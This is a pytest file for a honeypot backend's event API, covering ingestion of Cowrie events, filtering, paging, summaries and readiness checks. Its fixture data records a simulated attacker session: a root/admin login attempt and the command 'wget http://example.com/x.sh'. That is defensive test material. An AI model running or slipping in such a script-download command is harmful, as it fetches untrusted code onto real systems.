"""The read side of the storage requirement over HTTP (RF-03).

The dashboard consumes these endpoints, and so do RF-06 and RF-07.
"""

from __future__ import annotations

from collections.abc import AsyncIterator
from dataclasses import dataclass

import httpx
import pytest
from fastapi import FastAPI

from honeypot_backend.app import create_app
from honeypot_backend.config import Settings

BATCH_EVENTS = [
    {
        "eventid": "cowrie.session.connect",
        "timestamp": "2026-03-01T11:59:00.000000Z",
        "session": "sess-1",
    },
    {
        "eventid": "cowrie.login.failed",
        "timestamp": "2026-03-01T12:00:00.000000Z",
        "session": "sess-1",
        "username": "root",
        "password": "admin",
    },
    {
        "eventid": "cowrie.command.success",
        "timestamp": "2026-03-01T12:01:00.000000Z",
        "session": "sess-2",
        "username": "root",
        "input": "wget http://example.com/x.sh",
    },
]


@dataclass
class Backend:
    """A running backend, with the spool drained on demand."""

    app: FastAPI
    client: httpx.AsyncClient

    async def ingest(self, cowrie_event) -> int:
        """Ship a batch of Cowrie events and load them into PostgreSQL."""

        batch = {
            "agent_id": "agent-1",
            "batch_id": "batch-1",
            "events": [cowrie_event(**event) for event in BATCH_EVENTS],
        }
        response = await self.client.post("/api/v1/ingest/events", json=batch)
        assert response.status_code == 202, response.text
        assert response.json()["normalized"] == len(BATCH_EVENTS)
        return await self.app.state.replayer.run_once()


@pytest.fixture
async def backend(settings: Settings, engine, cowrie_event) -> AsyncIterator[Backend]:
    """A backend wired to the throwaway database, with no replayer loop."""

    app = create_app(settings)
    async with app.router.lifespan_context(app):
        transport = httpx.ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://backend") as client:
            yield Backend(app=app, client=client)


async def test_an_ingested_batch_can_be_queried(backend, cowrie_event) -> None:
    assert await backend.ingest(cowrie_event) == 3

    response = await backend.client.get("/api/v1/events")

    assert response.status_code == 200
    payload = response.json()
    assert payload["total"] == 3
    assert payload["limit"] == 50
    assert payload["offset"] == 0
    assert [item["event_type"] for item in payload["items"]] == [
        "command.success",
        "auth.login_failed",
        "session.connect",
    ]


async def test_events_are_ordered_and_paged(backend, cowrie_event) -> None:
    await backend.ingest(cowrie_event)

    first = await backend.client.get("/api/v1/events", params={"order": "asc", "limit": 2})
    second = await backend.client.get(
        "/api/v1/events", params={"order": "asc", "limit": 2, "offset": 2}
    )

    assert first.json()["total"] == second.json()["total"] == 3
    assert [item["event_type"] for item in first.json()["items"]] == [
        "session.connect",
        "auth.login_failed",
    ]
    assert [item["event_type"] for item in second.json()["items"]] == ["command.success"]


async def test_events_are_filtered_by_type_ip_session_and_search(backend, cowrie_event) -> None:
    await backend.ingest(cowrie_event)

    by_type = await backend.client.get("/api/v1/events", params={"event_type": "auth.login_failed"})
    by_ip = await backend.client.get("/api/v1/events", params={"source_ip": "203.0.113.10"})
    by_session = await backend.client.get("/api/v1/events", params={"session_id": "sess-2"})
    by_search = await backend.client.get("/api/v1/events", params={"q": "wget"})

    assert by_type.json()["total"] == 1
    assert by_ip.json()["total"] == 3
    assert by_session.json()["total"] == 1
    assert by_search.json()["total"] == 1


async def test_several_event_types_can_be_requested_at_once(backend, cowrie_event) -> None:
    await backend.ingest(cowrie_event)

    response = await backend.client.get(
        "/api/v1/events",
        params={"event_type": ["auth.login_failed", "command.success"]},
    )

    assert response.json()["total"] == 2


async def test_an_invalid_ip_is_rejected(backend, cowrie_event) -> None:
    await backend.ingest(cowrie_event)

    response = await backend.client.get("/api/v1/events", params={"source_ip": "not-an-ip"})

    assert response.status_code == 422


async def test_the_detail_of_a_stored_event_is_available(backend, cowrie_event) -> None:
    await backend.ingest(cowrie_event)
    listing = (await backend.client.get("/api/v1/events")).json()
    event_id = listing["items"][0]["event_id"]

    response = await backend.client.get(f"/api/v1/events/{event_id}")

    assert response.status_code == 200
    assert response.json()["event_id"] == event_id
    assert response.json()["raw"]["eventid"] == "cowrie.command.success"


async def test_an_unknown_event_is_not_found(backend, cowrie_event) -> None:
    await backend.ingest(cowrie_event)

    assert (await backend.client.get("/api/v1/events/does-not-exist")).status_code == 404


async def test_the_summary_aggregates_the_stored_events(backend, cowrie_event) -> None:
    await backend.ingest(cowrie_event)

    response = await backend.client.get("/api/v1/events/summary")

    assert response.status_code == 200
    payload = response.json()
    assert payload["total_events"] == 3
    assert payload["unique_source_ips"] == 1
    assert payload["unique_sessions"] == 2
    assert payload["auth_attempts"] == 1
    assert payload["commands"] == 1
    assert {entry["key"] for entry in payload["by_category"]} == {
        "session",
        "authentication",
        "command",
    }


async def test_the_summary_reports_no_alerts_while_detection_is_missing(backend) -> None:
    response = await backend.client.get("/api/v1/events/summary")

    # RF-11 and RF-12 are not implemented, so the RF-04 counter is a
    # documented placeholder instead of a fabricated number.
    assert response.json()["alerts"] == 0


async def test_an_empty_database_answers_without_events(backend) -> None:
    response = await backend.client.get("/api/v1/events")

    assert response.json()["total"] == 0
    assert response.json()["items"] == []


async def test_the_ingestion_stats_report_the_replayer(backend) -> None:
    response = await backend.client.get("/api/v1/ingest/stats")

    assert response.status_code == 200
    assert response.json()["replayer"]["events_loaded"] == 0


async def test_the_readiness_probe_reports_the_database(backend) -> None:
    response = await backend.client.get("/readyz")

    assert response.status_code == 200
    assert response.json()["database"]["status"] == "ok"
